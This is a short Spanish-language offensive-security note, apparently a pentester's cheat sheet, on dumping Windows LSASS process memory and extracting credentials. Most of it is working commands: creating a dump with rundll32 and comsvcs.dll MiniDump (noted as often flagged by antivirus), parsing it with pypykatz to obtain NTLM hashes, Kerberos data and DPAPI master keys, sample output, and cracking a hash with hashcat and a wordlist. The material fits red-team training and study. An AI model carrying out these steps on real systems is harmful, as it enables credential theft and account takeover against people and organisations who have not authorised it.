LSASS es un proceso central de Windows responsable de hacer cumplir las políticas de seguridad, gestionar la autenticación de usuarios y almacenar material de credenciales sensible en la memoria.

Tras el inicio de sesión inicial, LSASS:

- Almacenará en caché las credenciales localmente en la memoria
- Creará [tokens de acceso (access tokens)](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- Hará cumplir las políticas de seguridad
- Escribirá en el [registro de seguridad (security log)](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security) de Windows

Así que podremos volcar los hashes de credenciales de sesiones activas

### 1. Volcado LSASS
##### Mediante Adminstrador de Tareas (GUI)
En la pestaña de `procesos`, buscar:`Local Security Authority Process` y con el boton derecho `create dump file`. Se creará el fichero `%temp%/lsass.DMP`. 

##### Mediante Rundll32.exe y Comsvcs.dll
Esta manera, a menudo es detectada como acción maliciosa por los antivirus, pero es mas flexible y no requiere GUI.
```cmd
# (CMD) Localizar el PID del proceso LSASS
tasklist /svc
# (POWERSHELL) Localizar el PID del proceso LSASS
Get-Process lsass

# (POWERSHELL) Crear el volcado (dump) de LSASS
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

### 2. Extracción hashes
```
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```

Esto nos dará información de varias secciones:
```
....
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
    == MSV ==
        Username: bob
        Domain: DESKTOP-33E7O54
        LM: NA
        NT: 64f12cddaa88057e06a81b54e73b949b
        SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
        DPAPI: NA
    == WDIGEST [14ab89]==
        username bob
        domainname DESKTOP-33E7O54
        password None
        password (hex)
    == Kerberos ==
        Username: bob
        Domain: DESKTOP-33E7O54
    == WDIGEST [14ab89]==
        username bob
        domainname DESKTOP-33E7O54
        password None
        password (hex)
    == DPAPI [14ab89]==
        luid 1354633
        key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
        masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
        sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
        
        .....
```

* MSV veremos los hashes de credenciales NTLM
* WDIGEST se ven en texto claro las credenciales si fueran sistemas mas antiguos como Windows XP-Windows8, Server2003-2012
* Kerberos: Podriamos ver contraseñas, tickets de kerberos,  ekeys y pins
* DPAPI: Se muestra la master_key de DPAPI

### 3. Crack NTLM
Ejemplo de crack hash NTLM, aunque dependiendo lo que encontremos quizás hagamos otras cosas.
```bash
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```